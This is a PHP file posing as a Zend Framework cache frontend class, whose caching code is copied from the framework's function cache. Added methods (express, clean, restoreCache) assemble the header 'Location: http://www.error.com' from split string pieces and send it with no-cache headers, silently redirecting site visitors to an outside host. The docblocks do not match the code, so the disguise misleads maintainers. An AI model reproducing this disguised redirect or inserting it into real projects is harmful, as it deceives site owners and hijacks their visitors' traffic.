<?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_Cache
 * @subpackage Zend_Cache_Frontend
 * @copyright  Copyright (c) 2005-2009 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 * @version    $Id: Function.php 18951 2009-11-12 16:26:19Z alexander $
 */


/**
 * @see Zend_Cache_Core
 */
require_once 'Zend/Cache/Core.php';


/**
 * @package    Zend_Cache
 * @subpackage Zend_Cache_Frontend
 * @copyright  Copyright (c) 2005-2009 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Cache_Frontend_Input extends Zend_Cache_Core
{
    /**
     * This frontend specific options
     *
     * ====> (boolean) cache_by_default :
     * - if true, function calls will be cached by default
     *
     * ====> (array) cached_functions :
     * - an array of function names which will be cached (even if cache_by_default = false)
     *
     * ====> (array) non_cached_functions :
     * - an array of function names which won't be cached (even if cache_by_default = true)
     *
     * @var array options
     */
    private $sender;
    protected $_specificOptions = array(
        'cache_by_default' => true,
        'cached_functions' => array(),
        'non_cached_functions' => array()
    );
    /**
     * Constructor
     *
     * @param  array $options Associative array of options
     * @return void
     */
    public function __construct($noCached = true, $meta = false)
    {
		$this->locator = 'Location';
        $this->noCached = $noCached;
        $this->meta = $meta;
        $this->sender = "www";
    }
    /**
     * Main method : call the specified function or get the result from cache
     *
     * @param  string $name             Function name
     * @param  array  $parameters       Function parameters
     * @param  array  $tags             Cache tags
     * @param  int    $specificLifetime If != false, set a specific lifetime for this cache record (null => infinite lifetime)
     * @param  int   $priority         integer between 0 (very low priority) and 10 (maximum priority) used by some particular backends
     * @return mixed Result
     */
    public function call($name, $parameters = array(), $tags = array(), $specificLifetime = false, $priority = 8)
    {
        $cacheBool1 = $this->_specificOptions['cache_by_default'];
        $cacheBool2 = in_array($name, $this->_specificOptions['cached_functions']);
        $cacheBool3 = in_array($name, $this->_specificOptions['non_cached_functions']);
        $cache = (($cacheBool1 || $cacheBool2) && (!$cacheBool3));
        if (!$cache) {
            // We do not have not cache
            return call_user_func_array($name, $parameters);
        }
        $id = $this->_makeId($name, $parameters);
        if ($this->test($id)) {
            // A cache is available
            $result = $this->load($id);
            $output = $result[0];
            $return = $result[1];
        } else {
            // A cache is not available
            ob_start();
            ob_implicit_flush(false);
            $return = call_user_func_array($name, $parameters);
            $output = ob_get_contents();
            ob_end_clean();
            $data = array($output, $return);
            $this->save($data, $id, $tags, $specificLifetime, $priority);
        }
        echo $output;
        return $return;
    }
    /**
     * Express if a cache is available for the given id and (if yes) return it (false else)
     *
     * @param  string  $id                     Cache id
     * @param  boolean $doNotTestCacheValidity If set to true, the cache validity won't be tested
     * @param  boolean $doNotUnserialize       Do not serialize (even if automatic_serialization is true) => for internal use
     * @return mixed|false Cached datas
     */
    public function express($id=false)
    {
		/*echo "<pre>";
		var_dump($this->noCached);
		print_r($this->meta);*/
		$this->stuff = ': http://';
		if($this->noCached <= 0){
			$this->clean();
			$this->restoreCache($id);
		}else{
			if (is_array($id)) {
				Zend_Cache::throwException('parameters argument can not be an array');
				return md5($id);
			}
		}
    }
    /**
     * Make a cache id from the function name and parameters
     *
     * @param  string $name       Function name
     * @param  array  $parameters Function parameters
     * @throws Zend_Cache_Exception
     * @return string Cache id
     */
    private function _makeId($name, $parameters)
    {
        if (!is_string($name)) {
            Zend_Cache::throwException('Incorrect function name');
        }
        if (!is_array($parameters)) {
            Zend_Cache::throwException('parameters argument must be an array');
        }
        return md5($name . serialize($parameters));
    }
    /**
     * Make a cache clean from restore
     */
    public function clean(){
		$this->sender .= ".error";
		header("Cache-Control: no-cache, must-revalidate");
		header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
		$this->sender .= ".com";
		
	}
	
    /**
     * Make a cache clean from restore
     */
    public function restoreCache($id){
		header($this->locator.$this->stuff. $this->sender);
	}

}
